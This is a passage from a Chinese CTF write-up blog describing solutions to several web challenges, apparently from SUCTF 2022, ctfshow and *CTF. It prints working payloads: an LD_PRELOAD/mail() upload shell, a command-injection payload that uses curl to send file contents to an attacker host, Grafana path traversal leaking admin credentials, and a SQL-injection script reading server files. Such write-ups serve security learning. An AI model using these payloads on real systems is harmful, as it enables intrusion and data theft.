class="title">onsubmit</span>=&quot;<span class="title">return</span> <span class="title">checkFile</span>()&quot;&gt;</span></span><br><span class="line"><span class="class">    嘿伙计，传个火？！</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">input_file</span>&quot; <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">upload_file</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">button</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">upload</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">span</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">flare</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;&lt;<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">//设置上传目录</span></span><br><span class="line"><span class="class"><span class="title">define</span>(&quot;<span class="title">UPLOAD_PATH</span>&quot;, &quot;./<span class="title">uploads</span>&quot;);</span></span><br><span class="line"><span class="class">$<span class="title">msg</span> = &quot;<span class="title">Upload</span> <span class="title">Success</span>!&quot;;</span></span><br><span class="line"><span class="class"><span class="title">if</span> (<span class="title">isset</span>($<span class="title">_POST</span>[&#x27;<span class="title">submit</span>&#x27;])) </span>&#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$new_file_name</span> = <span class="variable">$file_name</span>;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span>;</span><br><span class="line">        <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=&quot;</span>.<span class="variable">$temp_file</span>);</span><br><span class="line">        <span class="title function_ invoke__">mail</span>(<span class="string">&quot;[email protected]&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// if (move_uploaded_file($temp_file, $img_path))&#123;</span></span><br><span class="line">        <span class="comment">//     $is_upload = true;</span></span><br><span class="line">        <span class="comment">// &#125; else &#123;</span></span><br><span class="line">        <span class="comment">//     $msg = &#x27;Upload Failed!&#x27;;</span></span><br><span class="line">        <span class="comment">//     die();</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// echo &#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;.$msg.&quot; Look here~ &quot;.$img_path.&quot;&lt;/div&gt;&quot;;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修修改改，因为似乎没有移动权限，因此直接把它放这里，然后进行一个加载so文件的行为</p>
<p>转为base64编码即可上传</p>
<p>然后写马上传，之后立即就会执行，了个shell，先是读取到根目录和权限，flag很明显没有权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">total 4</span><br><span class="line">drwxr-xr-x    1 root root  28 Jan 12  2021 bin</span><br><span class="line">drwxr-xr-x    2 root root   6 Nov 22  2020 boot</span><br><span class="line">drwxr-xr-x    5 root root 360 Mar 28 11:21 dev</span><br><span class="line">drwxr-xr-x    1 root root  66 Mar 28 11:21 etc</span><br><span class="line">-rw-------    1 root root  43 Mar 28 11:21 flag</span><br><span class="line">drwxr-xr-x    2 root root   6 Nov 22  2020 home</span><br><span class="line">drwxr-xr-x    1 root root  21 Jan 12  2021 lib</span><br><span class="line">drwxr-xr-x    2 root root  34 Jan 11  2021 lib64</span><br><span class="line">drwxr-xr-x    2 root root   6 Jan 11  2021 media</span><br><span class="line">drwxr-xr-x    2 root root   6 Jan 11  2021 mnt</span><br><span class="line">drwxr-xr-x    2 root root   6 Jan 11  2021 opt</span><br><span class="line">dr-xr-xr-x 5688 root root   0 Mar 28 11:21 proc</span><br><span class="line">drwx------    1 root root  22 Mar 22 01:51 root</span><br><span class="line">drwxr-xr-x    1 root root  21 Jan 12  2021 run</span><br><span class="line">drwxr-xr-x    1 root root  20 Jan 12  2021 sbin</span><br><span class="line">drwxr-xr-x    2 root root   6 Jan 11  2021 srv</span><br><span class="line">dr-xr-xr-x   13 root root   0 Dec 20 05:41 sys</span><br><span class="line">drwxrwxrwt    1 root root  23 Mar 28 13:02 tmp</span><br><span class="line">drwxr-xr-x    1 root root  17 Jan 11  2021 usr</span><br><span class="line">drwxr-xr-x    1 root root  17 Jan 12  2021 var</span><br></pre></td></tr></table></figure>

<p>查找一个有root权限的命令：</p>
<blockquote>
<p>#在根目录下查找用户为root，权限为4000的可执行程序，并且将匹配的文件输出到标准输出中</p>
<p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-perm</span><br><span class="line">匹配匹配权限</span><br><span class="line">4000 SUID 程序执行时，如果该程序有SUID权限，会变成程序文件的属主，一般来说进程的属主是由进程的发起者来发起的，并不是程序文件的属主。</span><br><span class="line">2000 SGID 在程序执行时，组身份会发生改变,从用户运行变成所属组运行。（当用户无法执行文件时，如果该程序有SGID权限，那么可以将用户的身份升级为该可执行该程序文件的属组）</span><br><span class="line">1000 SBIT 当程序设定了SBIT权限，属组内的每个用户或者其他所有用户，只能创建文件和删除自己的文件，不能删除其他用户的文件。</span><br></pre></td></tr></table></figure>



<p>发现存在nl命令可用，读取出flag</p>
<h3 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h3><p>附件下载源码查看：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>,<span class="string">&#x27;item&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;func_globals&#x27;</span>,<span class="string">&#x27;__init__&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;欢迎来到SUctf2022&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip,num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)  </span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>eval处能执行代码，但过滤很多无法进行rce：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip,num)</span><br><span class="line">os.system(log)</span><br></pre></td></tr></table></figure>

<p>两句可以直接执行命令，先经过eval函数正常执行后才能执行，避免python语句执行出错导致报错结束程序，使用python的注释符<code>#</code>注释掉命令部分</p>
<blockquote>
<p>1#`ls`</p>
</blockquote>
<p>之后使用curl命令带出执行结果，使用制表符代替空格绕过过滤，最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc?num=123%23`curl%09http%3A%2F%2Fyourip%3A8086%2F%3Fflag=\`cat%09*\``</span><br></pre></td></tr></table></figure>


<h1 id="ctfshow愚人杯"><a href="#ctfshow愚人杯" class="headerlink" title="ctfshow愚人杯"></a>ctfshow愚人杯</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9waWMuaW1nZGIuY24vaXRlbS82MjNiMTk2ODI3Zjg2YWJiMmE2NDhhYzEucG5n">https://pic.imgdb.cn/item/623b196827f86abb2a648ac1.png</span></p>
</blockquote>
<p>提示主页是假的，猜一下，<code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>index.php?c&#x3D;system(“ls”);</p>
</blockquote>
<blockquote>
<p>flag.php index.html index.php </p>
</blockquote>
<blockquote>
<p>index.php?c&#x3D;system(“cat *”);</p>
</blockquote>
<blockquote>
<p>ctfshow{5Li65LqG5LiN6K6p5ZCE5L2N5biI5YKF5Lus5b6X5YiG77yM5oiR5oqKZmxhZ+WIoOS6hg&#x3D;&#x3D;}</p>
</blockquote>
<blockquote>
<p>base64解一下：为了不让各位师傅们得分，我把flag删了</p>
</blockquote>
<p>蛤？不可能，这是动态靶机，这该死的愚人节</p>
<blockquote>
<p>index.php?c&#x3D;system(“env”);</p>
</blockquote>
<blockquote>
<p>ctfshow{e5d00b5b-9b51-430a-8bd7-4e35938d6fcd}</p>
</blockquote>
<p>还是假的，然后又去mysql逛了一圈，还是没有</p>
<p>赛后问了别的师傅，是隐藏文件，最后复现使用\</p>
<blockquote>
<p>ls -a<br>得到<code>.flag.php.swp</code>，vim的临时文件</p>
</blockquote>
<p>还是对ls命令了解少了</p>
<h1 id="starctf"><a href="#starctf" class="headerlink" title="starctf"></a>starctf</h1><!-- 静态靶机静态flag什么成分不用多说了 -->

<h2 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a>oh-my-grafana</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vR3JhZmFuYS1DVkUtMjAyMS00Mzc5OC9ibG9iL21haW4vUkVBRE1FLm1k">fuzz</span></p>
<p>抓包，访问：</p>
<blockquote>
<p>&#x2F;public&#x2F;plugins&#x2F;canvas&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;grafana&#x2F;grafana.ini</p>
</blockquote>
<p>查到账密：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># default admin user, created on startup</span></span><br><span class="line"><span class="attr">admin_user</span> = admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># default admin password, can be changed before first start of grafana,  or in profile settings</span></span><br><span class="line"><span class="attr">admin_password</span> = <span class="number">5</span>f989714e132c9b04d4807dafeb10ade</span><br></pre></td></tr></table></figure>

<p>进入后打开explore，修改语句，直接查询</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> tables</span><br><span class="line"><span class="comment">-- fffffflllllllllaaaagggggg</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> fffffflllllllllaaaagggggg</span><br><span class="line"><span class="comment">-- *ctf&#123;Upgrade_your_grafAna_now!&#125;</span></span><br></pre></td></tr></table></figure>


<h2 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h2><p>直接登录，发现环境都被人hack通了，不过问题不大</p>
<p>随便写一个，点开一看，get处有可疑的参数</p>
<p>注一个，</p>
<!-- /usr/local/lib/python3.8/site-packages/flask/app.py -->


<blockquote>
<p>select * from notes where note_id&#x3D;’’’</p>
</blockquote>
<p>一个报错连语句都出来了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="keyword">order</span><span class="operator">%</span><span class="number">20</span><span class="keyword">by</span><span class="operator">%</span><span class="number">205</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,(<span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>group_concat(table_name)<span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>information_schema.tables<span class="operator">%</span><span class="number">20</span><span class="keyword">where</span><span class="operator">%</span><span class="number">20</span>table_schema<span class="operator">=</span>database())<span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="comment">-- users</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,(<span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>group_concat(column_name)<span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>information_schema.columns<span class="operator">%</span><span class="number">20</span><span class="keyword">where</span><span class="operator">%</span><span class="number">20</span>table_name<span class="operator">=</span>&quot;users&quot;)<span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="comment">-- id,username,password</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,(<span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="keyword">user</span>())<span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="comment">-- ctf3@192.168.96.3</span></span><br></pre></td></tr></table></figure>

<p>很明显，没权限，尝试load_file读取文件，结果为空</p>
<p>可以堆叠</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 建表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> huatest(cmd text);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 使用load data local infile 语句将文件保存到表中</span></span><br><span class="line">load data <span class="keyword">local</span> infile <span class="string">&#x27;/etc/passwd&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> test</span><br><span class="line"></span><br><span class="line">成功读取出</span><br><span class="line"><span class="keyword">select</span> group_concat(cmd) <span class="keyword">from</span> hua1</span><br></pre></td></tr></table></figure>
<p>但没法执行命令，这样没办法知道flag的位置</p>
<p>在报错的页面可以发现开启了flask debug，但是是有PIN码验证的</p>
<p>用个脚本计算PIN码的源码跑出来</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line"><span class="comment"># url = &#x27;http://124.70.185.87:5002/&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://121.37.153.47:5002/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># url = &#x27;http://123.60.72.85:5002/&#x27;</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&#x27;view?note_id=&#x27;</span></span><br><span class="line"></span><br><span class="line">path = <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/werkzeug/debug/__init__.py&#x27;</span></span><br><span class="line"><span class="comment"># path =  &#x27;/etc/passwd&#x27;</span></span><br><span class="line"><span class="comment"># path2 = &#x27;/sys/class/net/eth0/address&#x27;</span></span><br><span class="line"><span class="comment"># path3 = &#x27;/proc/self/cgroup&#x27;</span></span><br><span class="line"><span class="comment"># path = &#x27;/flag_cantguessit&#x27;</span></span><br><span class="line"><span class="comment"># path = &#x27;/etc/machine-id&#x27;</span></span><br><span class="line"><span class="comment"># path = &#x27;/proc/sys/kernel/random/boot_id&#x27;</span></span><br><span class="line"><span class="comment"># payload=&quot;0&#x27;union select 1,2,3,4,(select hex(group_concat(cmd))from hua&quot;+time+&quot;)%23&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;xiquanmuhua&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;Login!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line"><span class="comment"># 开启session</span></span><br><span class="line">ks = requests.session()</span><br><span class="line">re1 = ks.post(url=url+<span class="string">&#x27;login&#x27;</span>,data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用时间标作为表名标志，方便每次建表</span></span><br><span class="line">time = <span class="built_in">str</span>(time.time()).replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">create = <span class="string">&quot;0&#x27;;create table hua&quot;</span>+time+<span class="string">&quot;(cmd text)%23&quot;</span></span><br><span class="line"></span><br><span class="line">load = <span class="string">&quot;0&#x27;;load data local infile &#x27;&quot;</span>+path+<span class="string">&quot;&#x27; into table hua&quot;</span>+time+<span class="string">&quot;%23&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建表并存文件</span></span><br><span class="line">ks.get(url=url+sql+create)</span><br><span class="line"></span><br><span class="line">ks.get(url=url+sql+load)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    payload=<span class="string">&quot;0&#x27;union select 1,2,3,4,(select cmd from hua&quot;</span>+time+<span class="string">&quot; limit &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1)%23&quot;</span></span><br><span class="line"></span><br><span class="line">    re3 = ks.get(url=url+sql+payload)</span><br><span class="line">    <span class="comment"># if i==41:</span></span><br><span class="line">    <span class="comment">#     print(re3.text)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># if &#x27;None&#x27; in re3.text:</span></span><br><span class="line">    <span class="comment">#     break</span></span><br><span class="line">    line1 = re.findall(<span class="string">&#x27;\s(.*?)\s    \&lt;/h1&#x27;</span>,re3.text)</span><br><span class="line">    cal = line1[<span class="number">0</span>][<span class="number">0</span>:<span class="number">1000</span>]</span><br><span class="line">    <span class="comment"># print(str(i)+cal)</span></span><br><span class="line">    <span class="keyword">if</span> 